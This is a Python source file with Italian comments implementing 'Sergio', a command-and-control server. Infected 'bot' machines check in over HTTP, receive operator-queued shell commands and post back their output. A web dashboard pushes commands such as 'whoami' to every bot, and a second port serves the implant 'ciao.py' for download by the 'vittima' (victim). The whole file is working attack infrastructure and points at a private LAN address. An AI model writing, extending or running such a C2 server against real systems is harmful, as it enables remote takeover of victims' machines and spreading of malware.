"""
sergio.py - Sergio Server (cs20 - 192.168.1.21)

Porte:
  8080 - sergio: dashboard, heartbeat, result
  8081 - file server statico (serve ciao.py alla vittima)

Endpoints sergio (:8080):
  GET  /           - dashboard bots connessi
  GET  /heartbeat  - bot fa check-in, riceve eventuale comando
  POST /result     - bot invia output del comando eseguito
  POST /command    - imposta comando dalla dashboard

Avvio (dalla cartella che contiene ciao.py):
  python3 sergio.py
"""

from http.server import BaseHTTPRequestHandler, HTTPServer, SimpleHTTPRequestHandler
from datetime import datetime, timezone
import json
import threading

# ---------------------------------------------------------------------------
# Stato in memoria
# ---------------------------------------------------------------------------

bots = {}
# bots[ip] = {"last_seen": datetime, "active": bool, "last_result": str}

pending_command = {"cmd": ""}
# comando da inviare al prossimo bot che fa check-in

lock = threading.Lock()

TIMEOUT_SECONDS = 30  # oltre questa soglia il bot e' considerato offline


# ---------------------------------------------------------------------------
# Handler HTTP
# ---------------------------------------------------------------------------

class SergioHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass  # silenzia il log di default

    # ---- GET ---------------------------------------------------------------

    def do_GET(self):
        if self.path == "/heartbeat":
            self._handle_heartbeat()
        elif self.path == "/":
            self._handle_dashboard()
        else:
            self.send_response(404)
            self.end_headers()

    def _handle_heartbeat(self):
        ip = self.client_address[0]
        now = datetime.now(timezone.utc)

        with lock:
            if ip not in bots:
                bots[ip] = {"last_seen": now, "active": True, "last_result": "", "pending_cmd": ""}
                print(f"[+] Nuovo bot connesso: {ip}")
            else:
                bots[ip]["last_seen"] = now
                bots[ip]["active"] = True

            cmd = bots[ip].get("pending_cmd", "")
            if cmd:
                bots[ip]["pending_cmd"] = ""
                print(f"[>] Invio comando a {ip}: {cmd}")
                response = cmd.encode()
            else:
                response = b""

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(response)

    def _handle_dashboard(self):
        now = datetime.now(timezone.utc)
        rows = ""

        with lock:
            for ip, info in bots.items():
                delta = (now - info["last_seen"]).seconds
                active = delta < TIMEOUT_SECONDS
                bots[ip]["active"] = active
                status = "ATTIVO" if active else "OFFLINE"
                color = "#00ff88" if active else "#ff4444"
                last_seen_str = info["last_seen"].strftime("%H:%M:%S")
                result_preview = (info["last_result"] or "-")[:80]

                rows += f"""
                <tr>
                    <td>{ip}</td>
                    <td>{last_seen_str} UTC ({delta}s fa)</td>
                    <td style="color:{color};font-weight:bold">{status}</td>
                    <td><code>{result_preview}</code></td>
                </tr>"""

        pending = pending_command["cmd"] or "(nessuno)"

        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="refresh" content="5">
    <title>Sergio Dashboard</title>
    <style>
        body {{ background: #111; color: #eee; font-family: monospace; padding: 2em; }}
        h1 {{ color: #00ff88; }}
        table {{ border-collapse: collapse; width: 100%; margin-top: 1em; }}
        th, td {{ border: 1px solid #333; padding: 0.5em 1em; text-align: left; }}
        th {{ background: #222; color: #aaa; }}
        tr:hover {{ background: #1a1a1a; }}
        .pending {{ color: #ffcc00; }}
        .refresh {{ color: #555; font-size: 0.8em; }}
    </style>
</head>
<body>
    <h1>Sergio Dashboard</h1>
    <p class="refresh">Auto-refresh ogni 5s | {datetime.now().strftime("%H:%M:%S")}</p>

    <h3>Bot connessi: {len(bots)}</h3>
    <table>
        <tr>
            <th>IP</th>
            <th>Last Heartbeat</th>
            <th>Stato</th>
            <th>Ultimo risultato</th>
        </tr>
        {rows if rows else '<tr><td colspan="4" style="color:#555">Nessun bot connesso</td></tr>'}
    </table>

    <h3>Comando in coda: <span class="pending">{pending}</span></h3>

    <form method="POST" action="/command">
        <input type="text" name="cmd" placeholder="es: whoami" style="padding:0.4em;width:300px;background:#222;color:#eee;border:1px solid #444">
        <button type="submit" style="padding:0.4em 1em;background:#00ff88;color:#111;border:none;cursor:pointer">Invia</button>
    </form>
</body>
</html>"""

        body = html.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    # ---- POST --------------------------------------------------------------

    def do_POST(self):
        if self.path == "/result":
            self._handle_result()
        elif self.path == "/command":
            self._handle_set_command()
        else:
            self.send_response(404)
            self.end_headers()

    def _handle_result(self):
        ip = self.client_address[0]
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode(errors="replace")

        with lock:
            if ip in bots:
                bots[ip]["last_result"] = body
        print(f"[<] Risultato da {ip}:\n{body}")

        self.send_response(200)
        self.end_headers()

    def _handle_set_command(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode()
        # form encoding: cmd=whoami
        cmd = ""
        for part in body.split("&"):
            if part.startswith("cmd="):
                cmd = part[4:].replace("+", " ")

        with lock:
            pending_command["cmd"] = cmd
            for ip in bots:
                bots[ip]["pending_cmd"] = cmd
        print(f"[*] Comando impostato a {len(bots)} bot: {cmd}")

        # redirect alla dashboard
        self.send_response(303)
        self.send_header("Location", "/")
        self.end_headers()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    port = 8080
    portserver = 8081

    # file server su 8081 - serve i file dalla cartella corrente (es. ciao.py)
    file_server = HTTPServer(("0.0.0.0", portserver), SimpleHTTPRequestHandler)
    t = threading.Thread(target=file_server.serve_forever, daemon=True)
    t.start()

    # sergio dashboard su 8080
    server = HTTPServer(("0.0.0.0", port), SergioHandler)
    print(f"[*] File server in ascolto su 0.0.0.0:{portserver}  (serve ciao.py)")
    print(f"[*] Sergio in ascolto su 0.0.0.0:{port}")
    print(f"[*] Dashboard:  http://192.168.1.21:{port}/")
    print(f"[*] Download:   http://192.168.1.21:{portserver}/ciao.py")
    print(f"[*] Heartbeat:  http://192.168.1.21:{port}/heartbeat")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server fermato")
